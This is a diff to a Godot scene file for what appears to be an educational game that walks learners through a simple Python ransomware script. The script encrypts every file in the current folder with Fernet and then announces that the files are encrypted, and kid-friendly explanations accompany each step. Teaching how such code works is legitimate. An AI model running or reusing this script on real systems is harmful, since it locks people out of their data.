@@ -1,4 +1,4 @@
-[gd_scene load_steps=54 format=3 uid="uid://cvlbm3qymf244"]
+[gd_scene load_steps=55 format=3 uid="uid://cvlbm3qymf244"]
 
 [ext_resource type="Script" uid="uid://bfj1dys1yrnvw" path="res://Scripts/GUI/ransowmare_encrypt.gd" id="1_pg7rw"]
 [ext_resource type="FontFile" uid="uid://bbhvwm260bx4g" path="res://Assets/Fonts/avantgarde_demi.ttf" id="2_nmigk"]
@@ -288,7 +288,7 @@ tracks/10/keys = {
 tracks/11/type = "value"
 tracks/11/imported = false
 tracks/11/enabled = true
-tracks/11/path = NodePath("WindowBackground/Window2:visible")
+tracks/11/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:editable")
 tracks/11/interp = 1
 tracks/11/loop_wrap = true
 tracks/11/keys = {
@@ -296,18 +296,6 @@ tracks/11/keys = {
 "transitions": PackedFloat32Array(1),
 "update": 1,
 "values": [false]
-}
-tracks/12/type = "value"
-tracks/12/imported = false
-tracks/12/enabled = true
-tracks/12/path = NodePath("WindowBackground/Window:visible")
-tracks/12/interp = 1
-tracks/12/loop_wrap = true
-tracks/12/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
 }
 
 [sub_resource type="Animation" id="Animation_oekl0"]
@@ -427,6 +415,7 @@ tracks/6/keys = {
 
 [sub_resource type="Animation" id="Animation_k4s4l"]
 resource_name = "ransomware_step_02"
+length = 2.0
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
@@ -434,10 +423,32 @@ tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1.05),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
 "values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')", "import os from cryptography.fernet 
 import fernet
 
 allfiles = [ ]
@@ -468,10 +479,10 @@ tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1.05),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": [true]
+"values": [true, true]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -480,12 +491,18 @@ tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 0.73333335),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["2. The Fernet system is like a super-secure lockbox .You put your message (data) inside it.
+"values": ["First, the program imports two important tools:
+1. The os module in Python is like a toolbox that helps your program “talk” to your computer. It can:
 
-Fernet locks it up with a special key so nobody else can peek inside.Later, if you have the same key, you can unlock it and get the original message back.
+- Look inside folders to see what’s there.
+- Check if something is a file or a folder.
+- Move around between different folders.
+- Work with file paths (the addresses of files on your computer).", "2. The Fernet system is like a super-secure lockbox .You put your message (data) inside it.
+
+Fernet uses a secret key to lock files so others can’t read them. With that same key later, you can unlock the files and get their original contents back.
 
 So, it’s basically a way to hide information so only the right person with the key can see it."]
 }
@@ -496,10 +513,10 @@ tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 0.73333335),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Importing the Tools"]
+"values": ["Importing the Tools", "Importing the Tools"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -508,10 +525,10 @@ tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/4/interp = 1
 tracks/4/loop_wrap = true
 tracks/4/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1.05),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(0.135, 0.45)]
+"values": [Vector2(0.135, 0.135), Vector2(0.135, 0.45)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -520,10 +537,10 @@ tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/5/interp = 1
 tracks/5/loop_wrap = true
 tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1.05),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(3.025, 0.26)]
+"values": [Vector2(3.025, 0.26), Vector2(3.025, 0.26)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -532,14 +549,15 @@ tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/6/interp = 1
 tracks/6/loop_wrap = true
 tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1.05),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [0.0]
+"values": [0.0, 0.0]
 }
 
 [sub_resource type="Animation" id="Animation_xwue7"]
 resource_name = "ransomware_step_03"
+length = 2.0
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
@@ -547,10 +565,32 @@ tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.03333333, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
 "values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')", "import os from cryptography.fernet 
 import fernet
 
 allfiles = [ ]
@@ -581,10 +621,10 @@ tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.03333333, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": [true]
+"values": [true, true]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -593,10 +633,14 @@ tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.01666668, 0.6666667),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["The program prepares a list of files to be encrypted:
+"values": ["2. The Fernet system is like a super-secure lockbox .You put your message (data) inside it.
+
+Fernet uses a secret key to lock files so others can’t read them. With that same key later, you can unlock the files and get their original contents back.
+
+So, it’s basically a way to hide information so only the right person with the key can see it.", "The program prepares a list of files to be encrypted:
 
 - It starts with an empty list called allfiles."]
 }
@@ -607,10 +651,10 @@ tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.01666668, 0.6666667),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Collecting Files to Encrypt"]
+"values": ["Importing the Tools", "Collecting Files to Encrypt"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -619,10 +663,10 @@ tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/4/interp = 1
 tracks/4/loop_wrap = true
 tracks/4/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.03333333, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(0.1, 1.07)]
+"values": [Vector2(0.135, 0.45), Vector2(0.1, 1.07)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -631,10 +675,10 @@ tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/5/interp = 1
 tracks/5/loop_wrap = true
 tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.03333333, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(3.025, 0.26)]
+"values": [Vector2(3.025, 0.26), Vector2(3.025, 0.26)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -643,14 +687,15 @@ tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/6/interp = 1
 tracks/6/loop_wrap = true
 tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.03333333, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [0.0]
+"values": [0.0, 0.0]
 }
 
 [sub_resource type="Animation" id="Animation_cxtjw"]
 resource_name = "ransomware_step_04"
+length = 2.0
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
@@ -658,10 +703,32 @@ tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.03333333, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
 "values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')", "import os from cryptography.fernet 
 import fernet
 
 allfiles = [ ]
@@ -692,10 +759,10 @@ tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.03333333, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": [true]
+"values": [true, true]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -704,10 +771,12 @@ tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.03333333, 0.73333335),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Then, it looks through file in the current directory using os.listdir(). It’s like you start with an empty bag, then look around the room to see what items (files and folders) are there."]
+"values": ["The program prepares a list of files to be encrypted:
+
+- It starts with an empty list called allfiles.", "Then, it looks through file in the current directory using os.listdir(). It’s like you start with an empty bag, then look around the room to see what items (files and folders) are there."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -716,10 +785,10 @@ tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.03333333, 0.73333335),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Collecting Files"]
+"values": ["Collecting Files to Encrypt", "Collecting Files"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -728,10 +797,10 @@ tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/4/interp = 1
 tracks/4/loop_wrap = true
 tracks/4/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.03333333, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(0.135, 1.375)]
+"values": [Vector2(0.1, 1.07), Vector2(0.135, 1.375)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -740,10 +809,10 @@ tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/5/interp = 1
 tracks/5/loop_wrap = true
 tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.03333333, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(3.025, 0.26)]
+"values": [Vector2(3.025, 0.26), Vector2(3.025, 0.26)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -752,14 +821,15 @@ tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/6/interp = 1
 tracks/6/loop_wrap = true
 tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.03333333, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [0.0]
+"values": [0.0, 0.0]
 }
 
 [sub_resource type="Animation" id="Animation_wf7ls"]
 resource_name = "ransomware_step_05"
+length = 2.0
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
@@ -767,10 +837,32 @@ tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
 "values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')", "import os from cryptography.fernet 
 import fernet
 
 allfiles = [ ]
@@ -801,10 +893,10 @@ tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": [true]
+"values": [true, true]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -813,8 +905,146 @@ tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 0.9),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": ["Then, it looks through file in the current directory using os.listdir(). It’s like you start with an empty bag, then look around the room to see what items (files and folders) are there.", "Some files are deliberately ignored so the program doesn’t mess itself up:
+
+- It skips the program’s own file (malware.py), so it doesn’t accidentally lock itself.
+- It skips the key file (key.key), because if that gets locked, there’s no way to unlock anything.
+- It skips the decryption script (decr.py), since that’s needed later to undo the lock.
+
+In simple term: The program doesn’t lock the tools it needs to run, like someone keeping the key outside the safe so they can still open it later."]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0, 0.9),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": ["Collecting Files", "Collecting Files"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 0,
+"values": [Vector2(0.135, 1.375), Vector2(0.1, 1.375)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 0,
+"values": [Vector2(3.025, 0.26), Vector2(3.77, 1.16)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 0,
+"values": [0.0, 0.0]
+}
+
+[sub_resource type="Animation" id="Animation_vuf0p"]
+resource_name = "ransomware_step_06"
+length = 2.0
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0.2666667, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')", "import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0, 0.76666665),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": [true, true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0, 0.7333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
 "values": ["Some files are deliberately ignored so the program doesn’t mess itself up:
 
@@ -822,7 +1052,7 @@ tracks/2/keys = {
 - It skips the key file (key.key), because if that gets locked, there’s no way to unlock anything.
 - It skips the decryption script (decr.py), since that’s needed later to undo the lock.
 
-In simple term: The program avoids locking the very tools it needs to work, kind of like a person hiding valuables but keeping the  key outside the safe so they can still open it later."]
+In simple term: The program doesn’t lock the tools it needs to run, like someone keeping the key outside the safe so they can still open it later.", "If an file is confirmed to be an actual file (not a folder), it is added to the list \"allfiles[]\"."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
@@ -831,10 +1061,10 @@ tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:
 tracks/3/interp = 1
 tracks/3/loop_wrap = true
 tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(-0.033333376, 0.76666665),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Collecting Files"]
+"values": ["Collecting Files", "Collecting Files"]
 }
 tracks/4/type = "value"
 tracks/4/imported = false
@@ -843,10 +1073,10 @@ tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/4/interp = 1
 tracks/4/loop_wrap = true
 tracks/4/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 0.76666665),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(0.1, 1.375)]
+"values": [Vector2(0.1, 1.375), Vector2(0.135, 2.635)]
 }
 tracks/5/type = "value"
 tracks/5/imported = false
@@ -855,10 +1085,10 @@ tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:sha
 tracks/5/interp = 1
 tracks/5/loop_wrap = true
 tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 0.76666665),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [Vector2(3.77, 1.16)]
+"values": [Vector2(3.77, 1.16), Vector2(3.735, 0.625)]
 }
 tracks/6/type = "value"
 tracks/6/imported = false
@@ -867,123 +1097,15 @@ tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/6/interp = 1
 tracks/6/loop_wrap = true
 tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0, 0.76666665),
+"transitions": PackedFloat32Array(1, 1),
 "update": 0,
-"values": [0.0]
-}
-
-[sub_resource type="Animation" id="Animation_vuf0p"]
-resource_name = "ransomware_step_06"
-tracks/0/type = "value"
-tracks/0/imported = false
-tracks/0/enabled = true
-tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
-tracks/0/interp = 1
-tracks/0/loop_wrap = true
-tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["import os from cryptography.fernet 
-import fernet
-
-allfiles = [ ]
-for file in os.listdir():
-	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
-		continue
-	if os.path.isfile(file):
-		allfiles.append(file)
-print (allfiles)
-
-key = Fernet.generate_key()
-with open ('key.key', 'wb') as thekey: 
-	thekey.write(key)
-
-for file in allfiles:
-	with open(file, 'rb') as thefile:
-		content = thefile.read()
-	content_encryp = Fernet(key).encrypt(content)
-	with open(file, 'wb') as thefile: 
-		thefile.write(content_encryp)
-
-print('All your files have been encrypted')"]
-}
-tracks/1/type = "value"
-tracks/1/imported = false
-tracks/1/enabled = true
-tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
-tracks/1/interp = 1
-tracks/1/loop_wrap = true
-tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": [true]
-}
-tracks/2/type = "value"
-tracks/2/imported = false
-tracks/2/enabled = true
-tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
-tracks/2/interp = 1
-tracks/2/loop_wrap = true
-tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["If an file is confirmed to be an actual file (not a folder), it is added to the list \"allfiles[]\"."]
-}
-tracks/3/type = "value"
-tracks/3/imported = false
-tracks/3/enabled = true
-tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
-tracks/3/interp = 1
-tracks/3/loop_wrap = true
-tracks/3/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 1,
-"values": ["Collecting Files"]
-}
-tracks/4/type = "value"
-tracks/4/imported = false
-tracks/4/enabled = true
-tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
-tracks/4/interp = 1
-tracks/4/loop_wrap = true
-tracks/4/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(0.135, 2.635)]
-}
-tracks/5/type = "value"
-tracks/5/imported = false
-tracks/5/enabled = true
-tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
-tracks/5/interp = 1
-tracks/5/loop_wrap = true
-tracks/5/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [Vector2(3.735, 0.625)]
-}
-tracks/6/type = "value"
-tracks/6/imported = false
-tracks/6/enabled = true
-tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
-tracks/6/interp = 1
-tracks/6/loop_wrap = true
-tracks/6/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
-"update": 0,
-"values": [0.0]
+"values": [0.0, 0.0]
 }
 
 [sub_resource type="Animation" id="Animation_gu46y"]
 resource_name = "ransomware_step_07"
+length = 2.0
 tracks/0/type = "value"
 tracks/0/imported = false
 tracks/0/enabled = true
@@ -991,10 +1113,32 @@ tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/Code
 tracks/0/interp = 1
 tracks/0/loop_wrap = true
 tracks/0/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.06666667, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
 "values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')", "import os from cryptography.fernet 
 import fernet
 
 allfiles = [ ]
@@ -1025,10 +1169,10 @@ tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
 tracks/1/interp = 1
 tracks/1/loop_wrap = true
 tracks/1/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.06666667, 1.0333333),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": [true]
+"values": [true, true]
 }
 tracks/2/type = "value"
 tracks/2/imported = false
@@ -1037,10 +1181,10 @@ tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/
 tracks/2/interp = 1
 tracks/2/loop_wrap = true
 tracks/2/keys = {
-"times": PackedFloat32Array(0),
-"transitions": PackedFloat32Array(1),
+"times": PackedFloat32Array(0.06666667, 0.73333335),
+"transitions": PackedFloat32Array(1, 1),
 "update": 1,
-"values": ["Finally, the list is printed out so we can see which files are going to be encrypted."]
+"values": ["If an file is confirmed to be an actual file (not a folder), it is added to the list \"allfiles[]\".", "Finally, the list is printed out so we can see which files are going to be encrypted."]
 }
 tracks/3/type = "value"
 tracks/3/imported = false
